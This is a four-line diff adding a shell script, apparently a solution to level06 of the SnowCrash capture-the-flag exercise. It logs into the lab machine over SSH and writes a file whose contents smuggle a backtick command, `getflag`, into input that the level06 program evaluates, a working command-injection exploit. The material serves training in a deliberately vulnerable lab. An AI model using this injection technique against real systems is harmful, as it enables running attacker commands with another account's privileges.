@@ -1,0 +1,4 @@
+ssh level06@$SNOWCRASH_IP -p 4242 '
+	echo "[x \${\`getflag\`}]" > /tmp/flag06
+	./level06 /tmp/flag06
+'
